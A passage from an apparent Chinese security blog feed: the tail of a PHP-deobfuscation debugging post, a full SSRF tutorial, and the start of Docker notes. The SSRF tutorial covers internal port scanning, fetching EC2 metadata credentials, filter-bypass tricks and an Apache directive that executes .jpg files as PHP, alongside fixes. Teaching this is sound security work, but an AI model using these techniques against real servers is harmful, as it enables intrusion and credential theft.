class="line">71</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop$ gdb php</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> args a.php </span><br><span class="line">gdb-peda$ b compile_string</span><br><span class="line">Breakpoint 1 at 0x46e73f: file Zend/zend_language_scanner.l, line 716.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /usr/<span class="built_in">local</span>/bin/php a.php </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555559c2726 (&lt;compile_string&gt;:push   rbp)</span><br><span class="line">RBX: 0x555555a68767 (&lt;execute_ex&gt;:push   rbp)</span><br><span class="line">RCX: 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">RDX: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>)</span><br><span class="line">RSI: 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">RDI: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>)</span><br><span class="line">RBP: 0x7fffffff9fa0 --&gt; 0x7fffffffa120 --&gt; 0x7fffffffa270 --&gt; 0x7fffffffa420 --&gt; 0x7fffffffa440 --&gt; 0x7fffffffa560 (--&gt; ...)</span><br><span class="line">RSP: 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">RIP: 0x5555559c273f (&lt;compile_string+25&gt;:mov    rax,QWORD PTR fs:0x28)</span><br><span class="line">R8 : 0x7fffffff96c0 --&gt; 0xb (<span class="string">'\x0b'</span>)</span><br><span class="line">R9 : 0x555555f2cd22 (<span class="string">"assert code"</span>)</span><br><span class="line">R10: 0x7 </span><br><span class="line">R11: 0xa (<span class="string">'\n'</span>)</span><br><span class="line">R12: 0x555555623210 (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdfb0 --&gt; 0x2 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555559c272a &lt;compile_string+4&gt;:sub    rsp,0x120</span><br><span class="line">   0x5555559c2731 &lt;compile_string+11&gt;:mov    QWORD PTR [rbp-0x118],rdi</span><br><span class="line">   0x5555559c2738 &lt;compile_string+18&gt;:mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">=&gt; 0x5555559c273f &lt;compile_string+25&gt;:mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x5555559c2748 &lt;compile_string+34&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x5555559c274c &lt;compile_string+38&gt;:xor    eax,eax</span><br><span class="line">   0x5555559c274e &lt;compile_string+40&gt;:mov    edi,0xf8</span><br><span class="line">   0x5555559c2753 &lt;compile_string+45&gt;:call   0x5555559e67f3 &lt;_emalloc&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">0008| 0x7fffffff9e88 --&gt; 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>)</span><br><span class="line">0016| 0x7fffffff9e90 --&gt; 0x8 </span><br><span class="line">0024| 0x7fffffff9e98 --&gt; 0x555556280608 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffff9ea0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 </span><br><span class="line">0040| 0x7fffffff9ea8 --&gt; 0x3d559e6d1a </span><br><span class="line">0048| 0x7fffffff9eb0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 </span><br><span class="line">0056| 0x7fffffff9eb8 --&gt; 0x5555559e6891 (&lt;_efree+78&gt;:leave)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, compile_string (source_string=0x7fffffffa030, filename=0x7ffff7e10e48 <span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>) at Zend/zend_language_scanner.l:716</span><br><span class="line">716&#123;</span><br><span class="line">gdb-peda$ p *source_string</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  value = &#123;</span><br><span class="line">    lval = 0x7ffff7fd22d0, </span><br><span class="line">    dval = 6.953349167324743e-310, </span><br><span class="line">    str = &#123;</span><br><span class="line">      val = 0x7ffff7fd22d0 <span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>, </span><br><span class="line">      len = 0x31</span><br><span class="line">    &#125;, </span><br><span class="line">    ht = 0x7ffff7fd22d0, </span><br><span class="line">    obj = &#123;</span><br><span class="line">      handle = 0xf7fd22d0, </span><br><span class="line">      handlers = 0x31</span><br><span class="line">    &#125;, </span><br><span class="line">    ast = 0x7ffff7fd22d0</span><br><span class="line">  &#125;, </span><br><span class="line">  refcount__gc = 0xffffa060, </span><br><span class="line">  <span class="built_in">type</span> = 0x6, </span><br><span class="line">  is_ref__gc = 0x7f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>​    混淆代码的解密就是类似于代码执行。最终还是要执行PHP代码，而执行PHP代码的方法很多，除了<code>eval</code>函数还有<code>assert</code>、<code>call_user_func</code>、<code>call_user_func_array</code>、<code>create_function</code>等。这些函数的底层也是调用了<code>zend_compile_string</code>，所以也可以利用hook <code>eval</code>来还原混淆后的加密代码。</p><p>​    这篇也就是对这个解密操作了一下记了个笔记，环境搭建还是比较繁琐的事，所以写的详细了点。了解归了解，现实中为了效率还是使用扩展比较方便，使用的扩展可以参考<a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">P牛</a>的，或者这个<a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="noopener">外国老哥</a>的。如果扩展需要编译的话，方法在上面说过了，编译后不想加入php.ini的话，可以在每次用的时候执行<code>php -d extension=evalhook.so a.php</code>。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p><a href="https://mp.weixin.qq.com/s/S2QJ2HiAqPFW2wo6aUAhCA" target="_blank" rel="noopener">解密混淆的PHP程序–逢魔安全实验室</a></p><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">phpjiami 数种解密方法—phithon</a></p><p><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="noopener">PHPDecode 在线解密工具—Medici.Yan</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###0x00 前言&lt;/p&gt;
&lt;p&gt;被混淆PHP代码见的很多了，但以前比较懒总是用扩展直接decode掉，最近就想手动操作下看看不使用扩展怎么进行解密。&lt;/p&gt;
&lt;h3 id=&quot;0x01-原理&quot;&gt;&lt;a href=&quot;#0x01-原理&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>了解SSRF,这一篇就足够了</title>
    <link href="http://zer0yu.github.io/2018/03/06/introduction-to-ssrf/"/>
    <id>http://zer0yu.github.io/2018/03/06/introduction-to-ssrf/</id>
    <published>2018-03-06T13:28:42.000Z</published>
    <updated>2018-11-12T11:54:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>###0x00 概念</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p><p>###0x01 可能出现的地方</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><p>13.web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p><p>14.PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>或者<code>&lt;script&gt;</code>元素或者CSS的<code>url()</code>函数。</p><p>15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p><p>16.链接扩展: 最近<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="noopener">Mark Litchfield在推特扩展链接上发现了漏洞</a>，名声大涨。</p><p>17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p><p>###0x02 漏洞验证</p><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><p>2.dnslog等工具进行测试，看是否被访问</p><p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p><p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>–通过二级域名暴力猜解工具模糊猜测内网地址</p><p>4.直接返回的Banner、title、content等信息</p><p>5.留意bool型SSRF</p><p>###0x03 利用方式</p><p>####1.让服务端去访问相应的网址</p><p>####2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p><p>####3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p><p>####4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p><p>####5.攻击内网应用程序（利用跨协议通信技术）</p><p>####6.判断内网主机是否存活：方法是访问看是否有端口开放</p><p>​    某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p><table><thead><tr><th><strong>URL parameter</strong></th><th><strong>Response HTTP status</strong></th><th><strong>RTT</strong></th><th><strong>Conclusion</strong></th></tr></thead><tbody><tr><td><strong><a href="http://127.0.0.1:22" target="_blank" rel="noopener">http://127.0.0.1:22</a></strong></td><td><strong>200</strong></td><td><strong>10ms</strong></td><td><strong>Port is open</strong></td></tr><tr><td><strong><a href="http://127.0.0.1:23" target="_blank" rel="noopener">http://127.0.0.1:23</a></strong></td><td><strong>500</strong></td><td><strong>10ms</strong></td><td><strong>Port is closed</strong></td></tr><tr><td><strong><a href="http://10.0.0.1/" target="_blank" rel="noopener">http://10.0.0.1/</a></strong></td><td><strong>500</strong></td><td><strong>30010ms</strong></td><td><strong>Firewalled or unable to route traffic to server</strong></td></tr><tr><td><strong><a href="http://10.0.0.1:8080/" target="_blank" rel="noopener">http://10.0.0.1:8080/</a></strong></td><td><strong>500</strong></td><td><strong>10ms</strong></td><td><strong>Port is closed and traffic is routed to server</strong></td></tr></tbody></table><p>​    对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。</p><p>####7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p><p>####8.提取EC2配置文件</p><p>越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。<a href="https://xz.aliyun.com/t/    http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank" rel="noopener">这是AWS文档</a>。如果你在EC2上发现了SSRF漏洞，试着请求<em><a href="http://169.254.169.254/latest/meta-data" target="_blank" rel="noopener">http://169.254.169.254/latest/meta-data</a></em>。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API token等等。你也可以下载_ <a href="http://169.254.169.254/latest/user-data_%E5%92%8C%E8%A7%A3%E5%8E%8B%E6%95%B0%E6%8D%AE%E3%80%82" target="_blank" rel="noopener">http://169.254.169.254/latest/user-data_和解压数据。</a></p><p>###0x04 绕过小技巧</p><p>注：参考[8]会有更详细的绕过方式总结</p><p>1.<a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p><p>2.各种IP地址的进制转换</p><p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p><p>4.短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p><p>5.xip.io来绕过：<a href="http://xxx.192.168.0.1.xip.io/" target="_blank" rel="noopener">http://xxx.192.168.0.1.xip.io/</a> == 192.168.0.1  (xxx 任意）</p><p>指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)</p><p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="noopener">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p><p>7.探测内网域名，或者将自己的域名解析到内网ip</p><p>8.例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p><p>但这样可以用 <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> 绕过</p><p>###0x05 漏洞示例</p><p>1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf</p><p>2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）</p><p>3.weblogic的ssrf</p><h3 id="0x06-漏洞靶场"><a href="#0x06-漏洞靶场" class="headerlink" title="0x06 漏洞靶场"></a>0x06 漏洞靶场</h3><p><a href="https://github.com/jobertabma/ground-control" target="_blank" rel="noopener">https://github.com/jobertabma/ground-control</a></p><p>###0x07 漏洞修复</p><p>1.禁止跳转</p><p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p><p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p><p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p><p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>###0x08 漏洞利用中牵涉的小技巧</p><p>crontab -l 显示当前计划任务</p><p>crontab -r 清除当前计划任务</p><p>端口转发工具 socat</p><p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p><p>AddType application/x-httpd-php .jpg<br>……</p><p>常用的探测内网地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 10.0.0.0/8</span><br><span class="line">- 127.0.0.1/32</span><br><span class="line">- 172.16.0.0/12</span><br><span class="line">- 192.168.0.0/16</span><br></pre></td></tr></table></figure><p>常用的探测端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22、80、443、8080、8443</span><br></pre></td></tr></table></figure><p>###0x09 相关材料</p><p>[1]<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></p><p>[2]<a href="https://paper.seebug.org/393/" target="_blank" rel="noopener">https://paper.seebug.org/393/</a></p><p>[3]<a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="noopener">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a></p><p>[4]<a href="http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html" target="_blank" rel="noopener">http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html</a></p><p>[5]<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p>[6]<a href="http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p>[7]<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p><p>[8]<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a></p><p>[9]<a href="https://www.cnblogs.com/s0ky1xd/p/5859049.html" target="_blank" rel="noopener">https://www.cnblogs.com/s0ky1xd/p/5859049.html</a></p><p>[10]<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></p><p>[11]<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p><p>[12]<a href="https://ricterz.me/posts/HITCON%202017%20SSRFme" target="_blank" rel="noopener">https://ricterz.me/posts/HITCON%202017%20SSRFme</a></p><p>[13]<a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/240.html</a></p><p>[14]<a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0</a></p><p>[15]<a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf</a></p><p>###0x10 后记</p><p>这篇是我整理了之前的一篇笔记，这篇笔记中没有给出案例。后面有空了也会把自己的一些案例笔记整理下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###0x00 概念&lt;/p&gt;
&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker笔记</title>
    <link href="http://zer0yu.github.io/2017/12/02/Docker%E7%AC%94%E8%AE%B0%E2%80%94%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>http://zer0yu.github.io/2017/12/02/Docker笔记—基础篇/</id>
    <published>2017-12-02T02:33:38.000Z</published>
    <updated>2018-11-28T16:06:11.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。</p><p>Docker容器：一个轻量级沙箱，来运行和隔离应用</p><p>Docker仓库：用来存储Docker镜像文件的地方</p><p>Docker中用于区分的方式是id或者name:tag</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官方文档：<a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p><h3 id="操作镜像"><a href="#操作镜像" class="headerlink" title="操作镜像"></a>操作镜像</h3><h4 id="1-获取镜像（默认是从docker-hub网站进行镜像的获取）"><a href="#1-获取镜像（默认是从docker-hub网站进行镜像的获取）" class="headerlink" title="1.获取镜像（默认是从docker hub网站进行镜像的获取）"></a>1.获取镜像（默认是从docker hub网站进行镜像的获取）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull kalilinux/kali-linux-docker</span><br><span class="line"><span class="comment">#如果想使用非官方仓库需要指定仓库完整的地址</span></span><br><span class="line">docker pull hub.c.163.com/public/ubuntu:14.04</span><br></pre></td></tr></table></figure><p>建议：使用中科大镜像源    <code>https://docker.mirrors.ustc.edu.cn</code></p><p>附带：<a href="https://segmentfault.com/a/1190000006146697" target="_blank" rel="noopener">在国内 docker build 的正确姿势</a></p><h4 id="2-列出镜像"><a href="#2-列出镜像" class="headerlink" title="2.列出镜像"></a>2.列出镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ docker images</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><p>REPOSITORY:来自哪个仓库</p><p>TAG:镜像的标签信息，能标示来自同一仓库的不同镜像</p><p>IMAGE ID:镜像的ID，此字段唯一标示了镜像</p><p>CREATED:创建时间</p><p>SIZE:镜像的大小</p><h4 id="3-添加镜像标签"><a href="#3-添加镜像标签" class="headerlink" title="3.添加镜像标签"></a>3.添加镜像标签</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对kalilinux/kali-linux-docker:latest添加新的标签kalilinux:latest</span></span><br><span class="line">➜  ~ docker tag kalilinux/kali-linux-docker:latest kalilinux:latest</span><br><span class="line"><span class="comment">#别名不一样但是两者的镜像文件是一样的（id相同）</span></span><br><span class="line">➜  ~ docker images</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</span><br><span class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><h4 id="4-查看详细信息"><a href="#4-查看详细信息" class="headerlink" title="4.查看详细信息"></a>4.查看详细信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ docker inspect kalilinux:latest</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Id"</span>: <span class="string">"sha256:8ececeaf404d5d63d4e9bf870f4340516f3be040e5db6c005ac8cf96d2c43536"</span>,</span><br><span class="line">        <span class="string">"RepoTags"</span>: [</span><br><span class="line">            <span class="string">"kalilinux/kali-linux-docker:latest"</span>,</span><br><span class="line">            <span class="string">"kalilinux:latest"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"RepoDigests"</span>: [</span><br><span class="line">            <span class="string">"kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d"</span></span><br><span class="line">        ],</span><br><span class="line">        ......</span><br><span class="line">        <span class="string">"Metadata"</span>: &#123;</span><br><span class="line">            <span class="string">"LastTagTime"</span>: <span class="string">"2017-12-02T04:56:53.8185955Z"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="5-查看镜像历史"><a href="#5-查看镜像历史" class="headerlink" title="5.查看镜像历史"></a>5.查看镜像历史</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ docker <span class="built_in">history</span> kalilinux:latest</span><br><span class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</span><br><span class="line">8ececeaf404d        9 months ago        /bin/sh -c <span class="comment">#(nop)  CMD ["/bin/bash"]            0B</span></span><br><span class="line">&lt;missing&gt;           9 months ago        /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   251MB</span><br><span class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="comment">#(nop)  ENV DEBIAN_FRONTEND=non...   0B</span></span><br><span class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="built_in">echo</span> <span class="string">"deb http://http.kali.org/...   134B</span></span><br><span class="line"><span class="string">&lt;missing&gt;           9 months ago        /bin/sh -c #(nop)  MAINTAINER steev@kali.org    0B</span></span><br><span class="line"><span class="string">&lt;missing&gt;           11 months ago       /bin/sh -c #(nop)  CMD ["</span>/bin/bash<span class="string">"]            0B</span></span><br><span class="line"><span class="string">&lt;missing&gt;           11 months ago       /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   286MB</span></span><br></pre></td></tr></table></figure><h4 id="6-搜索镜像"><a href="#6-搜索镜像" class="headerlink" title="6.搜索镜像"></a>6.搜索镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索所有自动创建的评价为1+的带kali关键字的镜像</span></span><br><span class="line">➜  ~ docker search --automated -s 3 kali</span><br><span class="line">Flag --automated has been deprecated, use --filter=is-automated=<span class="literal">true</span> instead</span><br><span class="line">Flag --stars has been deprecated, use --filter=stars=3 instead</span><br><span class="line">NAME                           DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">kalilinux/kali-linux-docker    Kali Linux Rolling Distribution Base Image      361                                     [OK]</span><br><span class="line">linuxkonsult/kali-metasploit   Kali base image with metasploit                 54                                      